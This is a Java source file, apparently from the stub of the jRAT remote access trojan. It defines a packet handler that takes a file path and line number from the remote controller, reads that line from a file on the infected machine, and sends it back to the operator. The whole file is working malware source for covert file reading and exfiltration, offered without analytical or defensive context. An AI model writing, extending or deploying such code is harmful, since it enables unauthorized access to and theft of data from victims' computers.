package se.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet42FilePreview;


public class Packet60PreviewFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.instance.readLine();
		int l = Connection.instance.readInt();
		int readed = 0;
		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));

		String line;

		while ((line = reader.readLine()) != null) {
			if (readed++ == l) {
				Connection.instance.addToSendQueue(new Packet42FilePreview(file, line));
				break;
			}
		}
		reader.close();
	}

}
